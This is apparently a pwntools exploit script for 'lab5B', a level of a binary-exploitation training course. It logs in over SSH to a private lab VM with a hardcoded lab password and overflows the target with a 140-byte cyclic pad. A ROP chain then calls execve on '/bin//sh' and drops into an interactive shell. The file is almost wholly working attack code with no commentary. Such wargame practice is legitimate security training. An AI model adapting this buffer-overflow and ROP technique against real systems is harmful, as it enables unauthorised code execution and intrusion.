#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template lab5B --user lab5B --pass s0m3tim3s_r3t2libC_1s_3n0ugh --host 192.168.56.101 --path /levels/lab05/lab5B
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab5B')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.56.101'
port = int(args.PORT or 22)
user = args.USER or 'lab5B'
password = args.PASSWORD or 's0m3tim3s_r3t2libC_1s_3n0ugh'
remote_path = '/levels/lab05/lab5B'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

context.kernel = 'i386'
rop = ROP(exe)
# '/bin//sh', char **argv = {pointer to '/bin//sh', NULL}, pointer to environ
rop.execve(0xbffff768, 0xbffff768 + 12, 0xbffff79c)
print (rop.dump())

payload = cyclic(140) + rop.chain() + p32(0x6e69622f) + p32(0x68732f2f) + p32(0x0) + p32(0xbffff768) + p32(0x0)
print ("\\x" + "\\x".join("{:02x}".format(ord(c)) for c in payload))

io.recvuntil("\n")
io.sendline(payload)

io.interactive()

